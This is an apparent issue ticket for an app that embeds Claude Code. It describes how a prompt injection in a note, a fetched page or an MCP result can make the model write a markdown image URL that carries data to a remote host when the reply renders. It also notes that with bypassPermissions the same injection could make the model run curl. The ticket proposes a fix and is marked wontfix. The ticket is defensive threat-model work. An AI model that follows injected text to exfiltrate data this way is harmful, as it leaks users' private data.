# 06: Remote images in Claude replies can leak data

**What to build:** Render remote images in Claude's replies as plain links the user clicks, so the panel never fetches a URL the model wrote. Images with a local source (`asset:`, `data:`, vault paths) still render.

**Blocked by:** 03

**Status:** wontfix

**Gate:** `pnpm check` + `pnpm vitest run`

- [ ] Failing test first: `renderReplyHtml` on `![x](https://example.com/p?d=secret)` returns no `<img>` with a remote `src`, and the URL is a link.
- [ ] `renderReplyHtml` (`src/lib/features/claude-code/claude.logic.ts`) turns every `img` whose `src` is `http:` or `https:` into a link to that URL with its alt text; `asset:`, `data:` and vault-relative images are unchanged. Pure, tested.

## Problem

Issue 03 renders replies with `renderCanvasMarkdown`, whose sanitizer keeps `img`, and the app CSP allows `img-src https:` (`src-tauri/tauri.conf.json:29`). A prompt injection (a note, a fetched page, an MCP result) that makes Claude write `![](https://host/?d=<data>)` makes the webview send that data to the host as soon as the reply renders. Found by an automated security review of Issue 03's commits.

## Comments

- 2026-11-14, owner: wontfix. With `bypassPermissions` the same injection can make Claude run `curl` and send far more, a risk the owner accepted (spec, Constraints, "Full permissions"); note rendering already loads remote images under the same CSP.
